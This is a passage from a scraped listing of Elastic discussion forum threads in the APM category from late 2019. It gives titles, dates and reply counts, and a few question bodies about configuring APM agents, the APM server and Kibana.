    "id": "a0ffefeb-fc29-4b0d-8631-45a5eaa6f8b4",
    "url": "https://discuss.elastic.co/t/uncertainty-unit-test-cases-in-apm-java-agent/212163",
    "title": "Uncertainty unit test cases in apm java agent",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "December 17, 2019, 12:54pm December 17, 2019, 1:15pm January 20, 2020, 9:10am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "2e03983d-79a2-46e8-a723-c049f08107c1",
    "url": "https://discuss.elastic.co/t/how-to-config-apm-output-to-kafka-with-topic-name-using-events-processor-event-name/213289",
    "title": "How to config APM output to kafka with topic name using event's processor event name",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "December 30, 2019, 7:08am December 30, 2019, 8:04am December 30, 2019, 7:47am December 30, 2019, 8:09am January 20, 2020, 4:06am",
    "body": "",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "3d034fa8-12db-4e62-a7bc-65d532e7e37d",
    "url": "https://discuss.elastic.co/t/can-i-view-custom-error-exception-which-is-appearing-in-tomcat-logs-at-apm-error-listing/213157",
    "title": "Can I view custom error/exception which is appearing in tomcat logs at APM error listing",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "December 29, 2019, 4:37am December 27, 2019, 8:32am December 27, 2019, 9:11am December 27, 2019, 9:31am December 29, 2019, 4:36am January 19, 2020, 12:36am",
    "body": "",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "10e83534-93f0-4169-810c-ddb6445557a5",
    "url": "https://discuss.elastic.co/t/new-threads-are-blocked-after-enabling-elastic-agent/213145",
    "title": "New Threads are blocked after enabling elastic agent",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "December 27, 2019, 6:49am December 29, 2019, 4:06am January 19, 2020, 12:06am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "1e30e6cf-6cac-4329-abd7-e1f0af7ef78b",
    "url": "https://discuss.elastic.co/t/instrument-incoming-http-requests/213242",
    "title": "Instrument incoming HTTP requests",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "December 28, 2019, 4:02am January 18, 2020, 12:08am",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "4848207c-34ba-4038-8009-907a84d6665b",
    "url": "https://discuss.elastic.co/t/the-unit-of-the-max-queue-size-reporter-config-option/213159",
    "title": "The unit of the max_queue_size reporter config option",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "December 27, 2019, 9:01am December 27, 2019, 9:09am December 27, 2019, 9:36am December 27, 2019, 10:12am January 17, 2020, 5:59am",
    "body": "",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "24e1bae2-09b0-4a9e-b5d1-099a61ac2491",
    "url": "https://discuss.elastic.co/t/application-high-response-time-with-nodejs-agent/213101",
    "title": "Application high response time with Nodejs agent",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "December 26, 2019, 4:25pm January 16, 2020, 12:26pm",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "51b60726-84e1-4bea-9486-6757ed9fbf8d",
    "url": "https://discuss.elastic.co/t/send-alert-only-if-the-error-has-http-status-code-500/212689",
    "title": "Send alert only if the error has http status code 500",
    "category": [
      "APM"
    ],
    "author": "Edgar_Peixoto",
    "date": "December 20, 2019, 4:44pm December 20, 2019, 8:59pm January 10, 2020, 4:59pm",
    "body": "I can send error alerts to a slack channel when an Java application send an error to APM. But I want to send only errors with status code 500. I tried to put the following in the bool filter but now the alert does not send anything at all. I also tried to use http.response.status_code with the same result. { \"term\": { \"context.response.status_code\": 500 } } I am using Elastic Cloud. Everything is in 7.5.1 version.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "1553d51b-d6ba-4a15-a9c2-93e5cd7b1a55",
    "url": "https://discuss.elastic.co/t/watch-creation-failed-make-sure-your-user-has-permission-to-create-watches/212656",
    "title": "Watch creation failed - Make sure your user has permission to create watches",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "December 20, 2019, 12:47pm December 20, 2019, 4:07pm December 20, 2019, 4:07pm January 10, 2020, 12:07pm",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "a16fea51-350b-446a-944e-3f2063586046",
    "url": "https://discuss.elastic.co/t/apm-errors-not-showing-in-kibana/212158",
    "title": "APM Errors not Showing in Kibana",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "December 17, 2019, 12:12pm December 20, 2019, 12:01pm January 10, 2020, 6:50am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "56582a18-cd77-4b43-8392-36f50380f86e",
    "url": "https://discuss.elastic.co/t/apm-server-not-creating-separate-indices/212142",
    "title": "APM server not creating separate indices",
    "category": [
      "APM"
    ],
    "author": "sharry007",
    "date": "December 17, 2019, 11:13am December 17, 2019, 3:19pm December 18, 2019, 11:04am December 18, 2019, 12:27pm December 19, 2019, 4:31am December 19, 2019, 2:04pm December 19, 2019, 2:01pm January 9, 2020, 10:01am",
    "body": "Kibana version: 7.4.0 Elasticsearch version: 7.4.0 APM Server version: 7.4.0 Upgraded from other version: From 6.7.1 I upgraded elastic stack and APM server to 7.4.0. I installed APM server from deb package. Earlier SSL was enabled for output.elasticsearch in apm-server.yml but now I have removed it. Other settings are same. I am facing below three problems: Separate indices are not created for different processor.event. I see that only one index is created per day, for example today's index is apm-7.4.0-2019.12.17. I am using default setting for example index: \"apm-%{[beat.version]}-error-%{+yyyy.MM.dd}\" when.contains: processor.event: \"error\" Whenever I try to see results in Kibana discover for index pattern apm-*, I get shard failed issue and the response is No field found for [context.service.name] in mapping with types []. I can see that the fields.yml file is different in 7.4.0 than 6.7.1 and there is no field for context. Should I copy the old fields.yml file and restart APM server? When I start APM server using systemctl start apm-server, logs are not being created in /var/log/apm-server/ but I can see logs in journalctl. When I start APM server using /usr/share/apm-server/bin/apm-server -c /etc/apm-server/apm-server.yml --path.home /usr/share/apm-server --path.config /etc/apm-server --path.data /var/lib/ap -server --path.logs /var/log/apm-server manually, I can see logs in /var/log/apm-server/. How can I configure APM server to send logs to default location when using systemctl command?",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "7abfc22b-d21a-453b-8a2b-ca6546d46155",
    "url": "https://discuss.elastic.co/t/how-to-find-customer-schema-in-apm/211952",
    "title": "How to find customer schema in APM?",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "December 16, 2019, 7:48am December 16, 2019, 12:37pm December 17, 2019, 6:23am December 17, 2019, 8:32am December 18, 2019, 6:26am December 18, 2019, 8:46am January 8, 2020, 4:46am",
    "body": "",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "de2a2486-92a8-42b7-b737-2b1ee3c9b17a",
    "url": "https://discuss.elastic.co/t/apm-7-5-0-not-resolving-api-paths-in-transactions/212061",
    "title": "APM 7.5.0 not resolving API paths in Transactions",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "December 16, 2019, 9:35pm December 17, 2019, 8:56am December 17, 2019, 1:55pm January 7, 2020, 9:54am",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "b7668ec7-6876-4127-a4db-6b09dbd2698b",
    "url": "https://discuss.elastic.co/t/elastic-apm-with-windows-services/212110",
    "title": "Elastic APM with windows services",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "December 17, 2019, 7:55am December 17, 2019, 1:08pm December 17, 2019, 1:08pm January 7, 2020, 9:22am",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "46c10b32-b625-4f35-a5e8-7faba574d9d4",
    "url": "https://discuss.elastic.co/t/do-you-support-apm-link-tracking-for-websocket/212087",
    "title": "Do you support APM link tracking for Websocket?",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "December 17, 2019, 8:30am December 17, 2019, 3:42am December 17, 2019, 5:17am December 17, 2019, 7:01am December 17, 2019, 7:53am December 17, 2019, 9:19am December 17, 2019, 10:39am December 17, 2019, 10:08am January 7, 2020, 6:08am",
    "body": "",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "bb8e5729-b58f-426c-b987-584f20dda43c",
    "url": "https://discuss.elastic.co/t/apm-data-not-showing-in-kibana/212035",
    "title": "APM Data not showing in Kibana",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "December 17, 2019, 8:26am December 17, 2019, 8:29am January 7, 2020, 4:29am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "80b10996-8418-4c11-a7c4-d663c898ebbe",
    "url": "https://discuss.elastic.co/t/errors-per-min-column-in-apm-shows-0-err-even-when-there-are-errors-inside/211950",
    "title": "Errors per min column in APM shows 0 err. even when there are errors inside",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "December 16, 2019, 12:34pm December 16, 2019, 1:46pm December 17, 2019, 5:51am January 7, 2020, 1:51am",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "7bcdb4b9-82a0-4e7e-820b-aa6dbfcc8e8a",
    "url": "https://discuss.elastic.co/t/server-fail-over-suggested-method/211843",
    "title": "Server fail over, suggested method",
    "category": [
      "APM"
    ],
    "author": "LordMathis",
    "date": "December 13, 2019, 8:16pm December 16, 2019, 6:03pm January 5, 2020, 6:25pm",
    "body": "Kibana version: 7.3 Elasticsearch version: 7.3 APM Server version: 7.3 APM Agent language and version: Intake API Our team was wondering what you all believe is the best method of fail over for the APM servers. We are alright with loosing the packets when the server goes down, that is not the issue, but our agent implementation was using HTTP calls. This meant that when the server went down all of our applications started doing blocking http calls that persisted until the http timeout. We mitigated this problem by putting all of our http sends into a thread. This allows our send to go down without effecting the user. Is this how it is handled in the other agents? What do you recommend to make certain that the server going down doesn't effect the code APM is monitoring?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "ead7ed60-d881-4a33-a533-f7ba35c6cfa4",
    "url": "https://discuss.elastic.co/t/how-to-use-traces-with-the-intake-api/211830",
    "title": "How to use traces with the intake API",
    "category": [
      "APM"
    ],
    "author": "LordMathis",
    "date": "December 13, 2019, 6:09pm December 15, 2019, 10:59pm January 5, 2020, 6:56pm",
    "body": "Kibana version: 7.3 Elasticsearch version: 7.3 APM Server version: 7.3 APM Agent language and version: New agent built for all versions of Delphi Original install method (e.g. download page, yum, deb, from source, etc.) and version: Web download I'd like to preface this discussion with the knowledge that I don't exactly quite understand what traces are used for. I believe it is some kind of method to clump all your transactions together so you can observe the flow of the entire application not just the flow of your transaction. My issue is essentially this, the intake API docs don't specify how to properly create a Trace, so I assumed it would be as simple as generating a trace ID and passing that trace id in on all my JSON, but it would appear as though this does not work. When I go to my traces tab there is nothing there and the % of trace on the transaction is N/A. What is it that I need to do to properly create a trace using the intake API?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "77325c5a-3ac3-4b26-84ba-5579cb568d53",
    "url": "https://discuss.elastic.co/t/get-currentspan-in-net-apm-agent/211741",
    "title": "Get CurrentSpan in .Net APM Agent",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "December 13, 2019, 4:14am December 13, 2019, 6:56am December 13, 2019, 6:44am December 13, 2019, 4:04pm December 13, 2019, 4:38pm December 14, 2019, 12:33pm December 14, 2019, 12:39pm January 4, 2020, 8:37am",
    "body": "",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "89684804-64f7-4b58-bba7-beb9028440e1",
    "url": "https://discuss.elastic.co/t/golang-apmchi-library-question/211738",
    "title": "Golang apmchi library question",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "December 13, 2019, 2:44am December 13, 2019, 3:19am January 2, 2020, 11:19pm",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "b766dec0-f85b-4a99-bc28-c93999874e78",
    "url": "https://discuss.elastic.co/t/cannot-find-logs-for-net-agent/211350",
    "title": "Cannot find logs for .NET agent",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "December 10, 2019, 6:02pm December 10, 2019, 6:20pm December 10, 2019, 6:50pm December 12, 2019, 9:17am December 12, 2019, 4:05pm January 2, 2020, 12:05pm",
    "body": "",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "e7912f14-d7fc-4764-a0b0-521cfa6770ba",
    "url": "https://discuss.elastic.co/t/create-multiple-secret-tokens/211458",
    "title": "Create Multiple Secret Tokens",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "December 11, 2019, 11:27am December 12, 2019, 9:40am December 11, 2019, 5:03pm December 12, 2019, 9:40am December 12, 2019, 9:40am January 2, 2020, 5:40am",
    "body": "",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "2da0fc9d-3326-4f8a-b30d-671d342d4e07",
    "url": "https://discuss.elastic.co/t/opentracing-net-elastic-apm-bridge/211573",
    "title": "OpenTracing .NET Elastic APM Bridge",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "December 12, 2019, 6:47am December 12, 2019, 9:30am January 2, 2020, 5:30am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "2b71ddce-f9ba-43a8-8e90-6cad09da25db",
    "url": "https://discuss.elastic.co/t/apm-custom-metrics-from-node-js-app/211559",
    "title": "APM custom metrics from node.js app",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "December 12, 2019, 4:53am January 2, 2020, 12:53am",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "62706c04-eb19-4fa1-8291-149d74d50473",
    "url": "https://discuss.elastic.co/t/elastic-apm-java-agent-sanitize-fields-names-on-application-json-data/211209",
    "title": "Elastic APM Java agent - sanitize_fields_names on application/json* data",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "December 10, 2019, 2:05am December 10, 2019, 8:56am December 11, 2019, 4:36pm January 1, 2020, 12:36pm",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "ff657aae-4d97-43a4-9b61-ea7a5d450cf7",
    "url": "https://discuss.elastic.co/t/how-to-monitore-cassandra-queries-in-the-dotnet-agent/211471",
    "title": "How to monitore Cassandra queries in the Dotnet Agent?",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "December 11, 2019, 1:37pm December 11, 2019, 2:21pm December 11, 2019, 2:38pm January 1, 2020, 10:38am",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "4254b48c-8acc-4d49-bc3f-d6fc0f4a9dc8",
    "url": "https://discuss.elastic.co/t/ruby-apm-custom-intrumentation-not-showing-span-in-cronilogical-order/211335",
    "title": "Ruby: APM custom intrumentation not showing span in cronilogical order",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "December 10, 2019, 4:33pm December 11, 2019, 12:27pm January 1, 2020, 8:27am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "1b66265b-14ad-4e84-8574-9dab34a91a4a",
    "url": "https://discuss.elastic.co/t/using-apm-with-latest-apollo-server-and-apollo-server-express-results-into-unknown-routes/209080",
    "title": "Using APM with latest Apollo Server and Apollo Server Express results into \"Unknown routes\"",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "November 25, 2019, 9:53am December 11, 2019, 11:14am January 1, 2020, 7:15am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "56f2811d-9be7-4133-9132-9d007a7ccb04",
    "url": "https://discuss.elastic.co/t/after-updating-apm-agent-from-1-1-2-to-1-2-transactions-are-empty/211081",
    "title": "After updating Apm Agent from 1.1.2 to 1.2 transactions are empty",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "December 9, 2019, 9:32am December 9, 2019, 9:54am December 9, 2019, 10:01am December 9, 2019, 11:24am December 9, 2019, 11:59am December 9, 2019, 5:55pm December 10, 2019, 6:57pm December 11, 2019, 4:36am December 11, 2019, 11:34am January 1, 2020, 6:52am",
    "body": "",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "ee5be697-73f9-466a-9508-a031554f775d",
    "url": "https://discuss.elastic.co/t/using-apm-to-monitor-a-java-application/211412",
    "title": "Using APM to monitor a JAVA application",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "December 11, 2019, 5:24am December 11, 2019, 8:27am January 1, 2020, 4:29am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "3177d52b-e7e5-45c1-a200-d17f680ab0aa",
    "url": "https://discuss.elastic.co/t/custom-transaction-naming/211317",
    "title": "Custom Transaction Naming",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "December 10, 2019, 2:30pm December 10, 2019, 4:49pm December 31, 2019, 12:48pm",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "9aa4fcc6-070c-4587-bade-d1c423763977",
    "url": "https://discuss.elastic.co/t/cannot-make-apm-client-work-on-iis/211179",
    "title": "Cannot make APM Client work on IIS",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "December 9, 2019, 7:41pm December 10, 2019, 1:47pm December 10, 2019, 1:51pm December 31, 2019, 9:51am",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "fdf1672f-7953-4cb7-a220-c7c07ea26319",
    "url": "https://discuss.elastic.co/t/apm-jms-tibco/211185",
    "title": "APM JMS -Tibco",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "December 10, 2019, 7:14am December 10, 2019, 10:20am December 10, 2019, 10:39am December 10, 2019, 12:42pm December 31, 2019, 8:42am",
    "body": "",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "436cbe14-436b-4f3a-8569-b2b6df8c5394",
    "url": "https://discuss.elastic.co/t/working-matrix-of-apm/211078",
    "title": "Working matrix of APM",
    "category": [
      "APM"
    ],
    "author": "srinarayanant",
    "date": "December 9, 2019, 9:21am December 30, 2019, 5:21am",
    "body": "<dependency> <groupId>io.opentracing.contrib</groupId> <artifactId>opentracing-spring-cloud-starter</artifactId> <version>0.2.3</version> </dependency> <dependency> <groupId>co.elastic.apm</groupId> <artifactId>apm-opentracing</artifactId> <version>1.8.0</version> </dependency> <dependency> <groupId>io.opentracing</groupId> <artifactId>opentracing-api</artifactId> <version>0.31.0</version> </dependency> <dependency> <groupId>io.opentracing</groupId> <artifactId>opentracing-util</artifactId> <version>0.31.0</version> </dependency>",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "f392156c-2922-417f-abf2-e262172c48d9",
    "url": "https://discuss.elastic.co/t/instrumenting-react-component-using-withtransaction-doesnt-work/210437",
    "title": "Instrumenting React component using withTransaction doesn't work",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "December 3, 2019, 11:31pm December 4, 2019, 7:35pm December 4, 2019, 7:59pm December 6, 2019, 9:45am December 6, 2019, 4:42pm December 27, 2019, 12:42pm",
    "body": "",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "51400550-ce32-43c5-b7a3-eab2b5175fdf",
    "url": "https://discuss.elastic.co/t/apm-for-spring-webflux/210637",
    "title": "APM for spring webflux",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "December 5, 2019, 8:31am December 5, 2019, 5:09pm December 6, 2019, 7:02am December 6, 2019, 1:21pm December 6, 2019, 2:38pm December 6, 2019, 3:18pm December 27, 2019, 11:19am",
    "body": "",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "80fe71cb-baad-463f-845a-58463d5333fd",
    "url": "https://discuss.elastic.co/t/support-for-istio-service-mesh/210829",
    "title": "Support for Istio service mesh",
    "category": [
      "APM"
    ],
    "author": "surenraju",
    "date": "December 6, 2019, 6:18am December 6, 2019, 2:05pm December 27, 2019, 10:05am",
    "body": "Elastic Search Version: 7.3.1 APM Server Version: 7.3.1 APM Client Version: APM Java Agent: 1.x (current) APM Agent language and version: Java 1.8 Is there any plan to provide integration with Istio for distributed tracing, metrics etc? Datadog and Stackdriver provides integration with Istio by providing Mixer adapter. Istio Datadog Adapter to deliver metrics to a dogstatsd agent for delivery to DataDog. Istio Stackdriver Adapter to deliver logs, metrics, and traces to Stackdriver. Thanks, Suren",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "c2604e49-aa9d-4e10-90f3-7500b0c9897d",
    "url": "https://discuss.elastic.co/t/how-to-add-label-in-java-apm-agent/210540",
    "title": "How to add label in Java apm agent",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "December 4, 2019, 1:34pm December 4, 2019, 1:40pm December 4, 2019, 2:11pm December 6, 2019, 7:03am December 6, 2019, 1:36pm December 27, 2019, 9:36am",
    "body": "",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "bec984c3-8251-4048-9a79-bbf3fa5c27f4",
    "url": "https://discuss.elastic.co/t/how-to-send-apm-agent-data-to-two-different-apm-servers/210602",
    "title": "How to send apm agent data to two different apm-servers",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "December 5, 2019, 8:33am December 5, 2019, 9:05am December 5, 2019, 5:54pm December 6, 2019, 1:30pm December 27, 2019, 9:30am",
    "body": "",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "b2a15e90-24e4-4ad9-855f-fb251ffd6f70",
    "url": "https://discuss.elastic.co/t/apm-config-overriding/207854",
    "title": "APM config overriding",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "November 14, 2019, 10:12am November 14, 2019, 10:43am November 14, 2019, 10:57am November 14, 2019, 12:18pm November 14, 2019, 4:12pm November 14, 2019, 4:23pm November 18, 2019, 11:11am December 4, 2019, 3:01pm December 5, 2019, 4:56pm December 26, 2019, 12:56pm",
    "body": "",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "2daa6ba9-e4a0-4c71-b455-ac8ab32bbb26",
    "url": "https://discuss.elastic.co/t/aggregated-distributed-tracing-view/210559",
    "title": "Aggregated Distributed Tracing View?",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "December 4, 2019, 3:27pm December 5, 2019, 2:59am December 5, 2019, 4:15pm December 26, 2019, 12:15pm",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "3f5cbd59-9880-41d3-a111-9513d1433d1e",
    "url": "https://discuss.elastic.co/t/after-enabling-x-pack-security-transactions-doesnt-appear-in-apm/210696",
    "title": "After Enabling X-Pack security,transactions doesn't appear in APM",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "December 5, 2019, 12:17pm December 5, 2019, 12:45pm December 5, 2019, 3:31pm December 26, 2019, 11:31am",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "1e807b12-54fb-4df6-bbf6-611a898af8c6",
    "url": "https://discuss.elastic.co/t/kibana-doesnt-show-apm-data/209996",
    "title": "Kibana doesn't show APM data",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "November 29, 2019, 7:05pm December 2, 2019, 7:53am December 4, 2019, 6:02pm December 25, 2019, 2:02pm",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "f85d36ba-7b3a-4eef-9493-3f8ae54446cf",
    "url": "https://discuss.elastic.co/t/not-see-sql-transactions/210202",
    "title": "Not see sql transactions",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "December 2, 2019, 2:42pm December 2, 2019, 2:58pm December 2, 2019, 3:48pm December 3, 2019, 9:25am December 3, 2019, 9:50am December 3, 2019, 11:03am December 3, 2019, 11:10am December 3, 2019, 11:10am December 3, 2019, 11:12am December 3, 2019, 11:12am December 3, 2019, 11:27am December 3, 2019, 1:36pm December 3, 2019, 3:51pm December 4, 2019, 2:06pm December 25, 2019, 10:06am",
    "body": "",
    "website_area": "discuss",
    "replies": 15
  },
  {
    "id": "249d0796-cf7c-4a5f-9ae4-5183cda81ea6",
    "url": "https://discuss.elastic.co/t/forward-errors-to-sentry/210386",
    "title": "Forward Errors to Sentry",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "December 3, 2019, 3:18pm December 3, 2019, 3:58pm December 24, 2019, 11:58am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "737ccd78-91dd-4038-a280-5918a7f54e3e",
    "url": "https://discuss.elastic.co/t/sourcemaps-dont-show-for-all-errors/209978",
    "title": "SourceMaps don't show for all Errors",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "November 29, 2019, 2:40pm December 2, 2019, 7:51am December 2, 2019, 12:19pm December 3, 2019, 8:00am December 3, 2019, 11:42am December 3, 2019, 1:23pm December 24, 2019, 9:23am",
    "body": "",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "d464d78c-a560-458c-8d94-4d18f96e59ac",
    "url": "https://discuss.elastic.co/t/elasticapm-integeration-py-did-not-see-the-place-where-we-can-point-apm-server-and-port-no/208302",
    "title": "Elasticapm_integeration.py, did not see the place where we can point APM server and port no",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "November 18, 2019, 11:50am November 18, 2019, 12:24pm November 19, 2019, 11:50am November 20, 2019, 11:49am November 25, 2019, 11:16am November 25, 2019, 2:45pm November 26, 2019, 3:39am December 2, 2019, 5:09pm December 23, 2019, 1:09pm",
    "body": "",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "a48f6846-c5e4-48ab-b1fa-493a7176c38d",
    "url": "https://discuss.elastic.co/t/apm-tracer-doesnt-show-python-code-time/210063",
    "title": "APM Tracer doesn't show Python code time",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "December 1, 2019, 1:51pm December 1, 2019, 2:18pm December 1, 2019, 2:39pm December 1, 2019, 9:21pm December 22, 2019, 5:21pm",
    "body": "",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "18d72a43-7476-41f9-8574-1d5037d5a92c",
    "url": "https://discuss.elastic.co/t/multiple-service-in-same-jvm/208569",
    "title": "Multiple \"service\" in same JVM",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "November 19, 2019, 7:20pm November 21, 2019, 5:08am November 21, 2019, 8:56am November 28, 2019, 2:10pm December 19, 2019, 10:10am",
    "body": "",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "326f3235-ee75-4d64-8871-bffd07259378",
    "url": "https://discuss.elastic.co/t/custom-distributed-transactions-linked-with-instrumented-spans/209584",
    "title": "Custom Distributed transactions linked with instrumented spans",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "November 27, 2019, 9:37pm November 27, 2019, 9:30pm December 18, 2019, 5:30pm",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "a6b86a2b-5153-4647-815a-e22112b7f687",
    "url": "https://discuss.elastic.co/t/distributed-tracing-question-about-how-to-implement/204734",
    "title": "Distributed Tracing question about how to implement",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "October 25, 2019, 6:22am October 23, 2019, 1:13am October 23, 2019, 3:36pm October 23, 2019, 8:15pm October 24, 2019, 5:02pm November 7, 2019, 2:57pm November 7, 2019, 2:57pm November 27, 2019, 9:08pm December 18, 2019, 5:08pm",
    "body": "",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "1bf9e7e5-3a9a-4300-8ad7-3659effbfe53",
    "url": "https://discuss.elastic.co/t/number-of-transactions-per-minute-reported-by-apm-is-significantly-different-than-request-count-in-monitoring-possible-reasons-for-the-discrepancy/209367",
    "title": "Number of transactions per minute reported by APM is significantly different than Request Count in monitoring. Possible reasons for the discrepancy?",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "November 26, 2019, 8:23am November 26, 2019, 10:09am November 26, 2019, 1:50pm November 26, 2019, 4:34pm November 26, 2019, 4:34pm November 27, 2019, 10:53am December 18, 2019, 6:53am",
    "body": "",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "e19688bb-c566-4318-84a5-8ddccba7e133",
    "url": "https://discuss.elastic.co/t/elasticsearch-aggregation-request-for-apm-trace-data/208328",
    "title": "Elasticsearch aggregation request for APM trace data",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "November 26, 2019, 5:25pm December 9, 2019, 10:18am",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "71c2eded-ebb5-488a-8e82-642f063dbc46",
    "url": "https://discuss.elastic.co/t/how-solve-get-unknown-route-from-apm-java/209364",
    "title": "How solve \"GET unknown route\" from APM Java?",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "November 25, 2019, 7:33pm November 26, 2019, 11:17am December 17, 2019, 7:29am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "db134b28-ee69-4e18-9236-00a7b4867a23",
    "url": "https://discuss.elastic.co/t/python-agent-how-to-track-various-counters-values-evolution-over-time/209176",
    "title": "Python Agent how to track various counters/values evolution over time?",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "November 24, 2019, 12:04pm November 25, 2019, 1:41am November 25, 2019, 9:41pm November 26, 2019, 3:02am November 26, 2019, 10:05am December 17, 2019, 6:05am",
    "body": "",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "c63d91ad-f5b6-4bde-bce5-f976284e1020",
    "url": "https://discuss.elastic.co/t/span-log-with-opentracing/209366",
    "title": "Span.log with opentracing",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "November 26, 2019, 8:42am November 26, 2019, 2:03am December 16, 2019, 10:04pm",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "8625d8e9-230a-4fe4-a9e9-03ec41dca112",
    "url": "https://discuss.elastic.co/t/error-publishing-app-with-dotnet-fullframework-apm/209303",
    "title": "Error publishing app with dotnet fullframework APM",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "November 25, 2019, 12:45pm November 25, 2019, 1:51pm November 25, 2019, 1:28pm December 16, 2019, 9:30am",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "7bc3f520-d913-4a24-b3a7-240603d418f2",
